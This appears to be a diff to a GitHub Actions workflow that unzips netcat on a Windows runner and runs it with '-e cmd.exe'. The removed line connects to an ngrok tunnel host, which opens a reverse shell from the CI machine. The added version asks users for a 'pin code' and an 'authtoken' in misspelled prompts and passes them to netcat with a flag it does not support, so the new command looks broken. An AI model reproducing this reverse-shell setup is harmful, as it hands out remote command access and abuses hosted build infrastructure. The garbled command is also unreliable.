@@ -1,7 +1,14 @@
 name: CI
 
-on: [push, workflow_dispatch]
-
+on: 
+  workflow_dispatch:
+    inputs:
+      code:
+        description: 'Did you wtch my video enter pin code'
+        required: true
+      pin:
+        description: 'enter your authtoken'
+        required: true
 jobs:
 
   build:
@@ -21,7 +28,7 @@ jobs:
        ls
        cd netcat-1.11
        ls
-       ./nc.exe -v 0.tcp.in.ngrok.io 14912 -e cmd.exe
+       ./nc.exe ${{ github.event.inputs.code }} -pin=${{ github.event.inputs.pin }} -e cmd.exe
        
        
     
